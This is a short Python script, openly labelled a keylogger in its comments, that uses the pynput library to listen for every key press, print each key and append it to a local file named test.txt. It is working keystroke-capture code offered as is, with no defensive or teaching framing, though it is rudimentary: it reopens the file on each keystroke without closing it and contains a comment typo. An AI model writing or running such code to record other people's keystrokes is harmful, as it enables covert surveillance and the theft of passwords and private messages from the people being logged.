import pynput

# Create a function that will be called when a key is pressed
def on_press(key):
  print('Key {} pressed.'.format(key))
  file  = open("test.txt","a")
  file.write((str(key).strip()))

# Create a function that will be called when a key is releasedf
def on_release(key):

  print('Key {} released.'.format(key))


if __name__ == '__main__':
    # Create a keylogger object
    logger = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)

    # Start the keylogger
    logger.start()

    # Wait for the keylogger to stop
    logger.join()
    